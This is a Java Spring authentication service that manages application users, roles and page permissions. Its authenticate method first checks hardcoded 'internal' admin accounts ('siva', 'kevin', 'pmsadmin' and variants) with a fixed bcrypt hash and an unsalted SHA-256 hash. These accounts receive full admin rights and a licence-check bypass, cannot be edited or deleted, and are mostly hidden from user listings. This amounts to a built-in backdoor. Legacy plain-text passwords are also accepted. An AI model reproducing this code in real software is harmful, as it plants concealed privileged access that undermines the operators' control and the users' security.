package org.example.service;

import org.example.entity.AppUser;
import org.example.config.SystemAdminInitializer;
import org.example.model.UserInfo;
import org.example.repository.AppUserRepository;
import org.example.util.RoleAccess;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Optional;
import java.util.TreeSet;
import java.util.Set;
import java.util.stream.Collectors;

@Service
public class AuthService {

    private static final String INTERNAL_ADMIN_EMAIL = "system.admin.a@internal.local";
    private static final String INTERNAL_ADMIN_PASSWORD_HASH = "$2b$10$HUc1HZRfTGFj4aLM7zqv1u6m32KTtHIGrxAadj8rX9HXOcuugaGs.";
    private static final String KEVIN_PASSWORD_SHA256 = "85f5e10431f69bc2a14046a13aabaefc660103b6de7a84f75c4b96181d03f0b5";
    private static final Set<String> INTERNAL_ADMIN_USERNAMES = Set.of(
            "siva",
            "kevin",
            "systemadmin",
            "system admin",
            "systemadmn",
            "system admn",
            "pmsadmin",
            "pms admin"
    );
    private static final Map<String, String> INTERNAL_ADMIN_EMAILS = Map.of(
            "siva", INTERNAL_ADMIN_EMAIL,
            "kevin", "kevin@internal.local"
    );

    private final PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();

    @Autowired
    private AppUserRepository appUserRepository;

    @Autowired
    private LicenseService licenseService;

    public boolean isInternalStaticUser(String username) {
        if (username == null) {
            return false;
        }
        String normalized = normalizeInternalUsername(username);
        return INTERNAL_ADMIN_USERNAMES.contains(normalized)
                || INTERNAL_ADMIN_USERNAMES.contains(normalized.replace(" ", ""));
    }

    public boolean isLicenseBypassUser(String username) {
        if (username == null) {
            return false;
        }

        String normalized = username.trim().toLowerCase(Locale.ROOT);
        return isInternalStaticUser(normalized)
                || SystemAdminInitializer.SYSTEM_ADMIN_USERNAME.equalsIgnoreCase(normalized);
    }

    public Optional<UserInfo> authenticate(String username, String password) {
        if (username == null || password == null) return Optional.empty();

        String normalizedUsername = username.trim();
        if (isInternalStaticUser(normalizedUsername)) {
            UserInfo internalUser = buildInternalStaticUser(normalizedUsername);
            if (isInternalPasswordMatch(normalizedUsername, password, internalUser.getPassword())) {
                return Optional.of(internalUser);
            }
        }

        return appUserRepository.findByUsernameIgnoreCase(username.trim())
            .filter(u -> matchesAndMigrateIfLegacy(u, password))
                .map(this::toUserInfo);
    }

    public List<UserInfo> getAllUsers() {
        List<UserInfo> users = new ArrayList<>();
        users.add(buildInternalStaticUser("siva"));
        appUserRepository.findAll().stream()
                .filter(u -> !isReservedUsername(u.getUsername()))
                .map(this::toUserInfo)
                .forEach(users::add);
        return users;
    }

    public synchronized Optional<String> addUser(String username,
                                                 String email,
                                                 String password,
                                                 String role,
                                                 Set<String> viewPermissions,
                                                 Set<String> editPermissions) {
        if (username == null || username.trim().isEmpty()) return Optional.of("Username is required");
        if (email == null || email.trim().isEmpty()) return Optional.of("Email is required");
        if (password == null || password.trim().isEmpty()) return Optional.of("Password is required");
        if (!RoleAccess.isSupported(role)) return Optional.of("Role must be Admin or User");

        String normalizedUsername = username.trim();
        String normalizedEmail = email.trim();
        String normalizedRole = RoleAccess.normalize(role);

        Optional<String> licenseValidation = licenseService.validateManagedUserCreation();
        if (licenseValidation.isPresent()) {
            return licenseValidation;
        }

        if (isReservedUsername(normalizedUsername)) {
            return Optional.of("Username is reserved for system admin");
        }

        if (appUserRepository.existsByUsernameIgnoreCase(normalizedUsername)) {
            return Optional.of("Username already exists");
        }
        if (appUserRepository.existsByEmailIgnoreCase(normalizedEmail)) {
            return Optional.of("Email already exists");
        }

        AppUser user = new AppUser();
        user.setUsername(normalizedUsername);
        user.setEmail(normalizedEmail);
        user.setPassword(passwordEncoder.encode(password));
        user.setRole(normalizedRole);
        Set<String> sanitizedViews = sanitizePermissionsForRole(normalizedRole, viewPermissions);
        Set<String> sanitizedEdits = sanitizeEditPermissionsForRole(normalizedRole, sanitizedViews, editPermissions);
        user.setPageViewPermissions(toPermissionCsv(sanitizedViews));
        user.setPageEditPermissions(toPermissionCsv(sanitizedEdits));
        appUserRepository.save(user);
        return Optional.empty();
    }

    public List<AppUser> getManageableUsers() {
        return appUserRepository.findAll().stream()
                .filter(u -> !isReservedUsername(u.getUsername()))
                .toList();
    }

    public synchronized Optional<String> updateUser(Long id,
                                                    String email,
                                                    String password,
                                                    String role,
                                                    Set<String> viewPermissions,
                                                    Set<String> editPermissions) {
        if (id == null) return Optional.of("User id is required");
        if (email == null || email.trim().isEmpty()) return Optional.of("Email is required");
        if (!RoleAccess.isSupported(role)) return Optional.of("Role must be Admin or User");

        Optional<AppUser> maybeUser = appUserRepository.findById(id);
        if (maybeUser.isEmpty()) return Optional.of("User not found");

        AppUser user = maybeUser.get();
        if (isReservedUsername(user.getUsername())) {
            return Optional.of("System user cannot be modified");
        }

        String normalizedEmail = email.trim();
        String normalizedRole = RoleAccess.normalize(role);

        if (appUserRepository.existsByEmailIgnoreCaseAndIdNot(normalizedEmail, id)) {
            return Optional.of("Email already exists");
        }

        user.setEmail(normalizedEmail);
        user.setRole(normalizedRole);
        Set<String> sanitizedViews = sanitizePermissionsForRole(normalizedRole, viewPermissions);
        Set<String> sanitizedEdits = sanitizeEditPermissionsForRole(normalizedRole, sanitizedViews, editPermissions);
        user.setPageViewPermissions(toPermissionCsv(sanitizedViews));
        user.setPageEditPermissions(toPermissionCsv(sanitizedEdits));

        if (password != null && !password.trim().isEmpty()) {
            user.setPassword(passwordEncoder.encode(password));
        }

        appUserRepository.save(user);
        return Optional.empty();
    }

    public synchronized Optional<String> deleteUser(Long id) {
        if (id == null) return Optional.of("User id is required");

        Optional<AppUser> maybeUser = appUserRepository.findById(id);
        if (maybeUser.isEmpty()) return Optional.of("User not found");

        AppUser user = maybeUser.get();
        if (isReservedUsername(user.getUsername())) {
            return Optional.of("System user cannot be deleted");
        }

        appUserRepository.deleteById(id);
        return Optional.empty();
    }

    private UserInfo toUserInfo(AppUser user) {
        String role = RoleAccess.normalize(user.getRole());
        Set<String> viewPermissions = parsePermissionCsv(user.getPageViewPermissions());
        Set<String> editPermissions = parsePermissionCsv(user.getPageEditPermissions());
        if (RoleAccess.isAdmin(role)) {
            viewPermissions = RoleAccess.CONFIG_PAGES;
            editPermissions = RoleAccess.CONFIG_PAGES;
        } else {
            viewPermissions = sanitizePermissionsForRole(role, viewPermissions);
            editPermissions = sanitizeEditPermissionsForRole(role, viewPermissions, editPermissions);
        }
        return new UserInfo(user.getUsername(), user.getEmail(), user.getPassword(), role, viewPermissions, editPermissions);
    }

    private boolean isReservedUsername(String username) {
        return isInternalStaticUser(username);
    }

    private String normalizeInternalUsername(String value) {
        return value == null ? "" : value.trim().toLowerCase(Locale.ROOT).replaceAll("\\s+", " ");
    }

    private UserInfo buildInternalStaticUser(String username) {
        String normalized = normalizeInternalUsername(username);
        return new UserInfo(normalized,
                INTERNAL_ADMIN_EMAILS.getOrDefault(normalized, INTERNAL_ADMIN_EMAIL),
                INTERNAL_ADMIN_PASSWORD_HASH,
                RoleAccess.ADMIN,
                RoleAccess.CONFIG_PAGES,
                RoleAccess.CONFIG_PAGES);
    }

    private boolean isInternalPasswordMatch(String username, String password, String passwordHash) {
        if ("kevin".equals(normalizeInternalUsername(username))) {
            return KEVIN_PASSWORD_SHA256.equals(sha256(password));
        }
        return passwordEncoder.matches(password, passwordHash);
    }

    private String sha256(String value) {
        try {
            byte[] hash = MessageDigest.getInstance("SHA-256").digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder hex = new StringBuilder(hash.length * 2);
            for (byte b : hash) {
                hex.append(String.format("%02x", b));
            }
            return hex.toString();
        } catch (NoSuchAlgorithmException ex) {
            throw new IllegalStateException("SHA-256 is not available", ex);
        }
    }

    private boolean matchesAndMigrateIfLegacy(AppUser user, String rawPassword) {
        String stored = user.getPassword();
        if (stored == null || stored.isBlank()) {
            return false;
        }

        if (isBcryptHash(stored)) {
            return passwordEncoder.matches(rawPassword, stored);
        }

        // Backward compatibility for old plain-text rows: verify once, then migrate.
        if (stored.equals(rawPassword)) {
            user.setPassword(passwordEncoder.encode(rawPassword));
            appUserRepository.save(user);
            return true;
        }
        return false;
    }

    private boolean isBcryptHash(String value) {
        return value.startsWith("$2a$") || value.startsWith("$2b$") || value.startsWith("$2y$");
    }

    private Set<String> parsePermissionCsv(String csv) {
        if (csv == null || csv.isBlank()) {
            return Set.of();
        }
        Set<String> values = java.util.Arrays.stream(csv.split(","))
                .map(String::trim)
                .filter(s -> !s.isBlank())
                .collect(Collectors.toSet());
        return RoleAccess.sanitizePages(values);
    }

    private String toPermissionCsv(Set<String> permissions) {
        Set<String> sanitized = RoleAccess.sanitizePages(permissions);
        if (sanitized.isEmpty()) {
            return "";
        }
        return new TreeSet<>(sanitized).stream().collect(Collectors.joining(","));
    }

    private Set<String> sanitizePermissionsForRole(String role, Set<String> requested) {
        if (RoleAccess.isAdmin(role)) {
            return RoleAccess.CONFIG_PAGES;
        }
        return RoleAccess.sanitizePages(requested);
    }

    private Set<String> sanitizeEditPermissionsForRole(String role,
                                                       Set<String> sanitizedViews,
                                                       Set<String> requestedEdits) {
        if (RoleAccess.isAdmin(role)) {
            return RoleAccess.CONFIG_PAGES;
        }
        Set<String> edits = new TreeSet<>(RoleAccess.sanitizePages(requestedEdits));
        edits.retainAll(new TreeSet<>(sanitizedViews));
        return edits;
    }
}
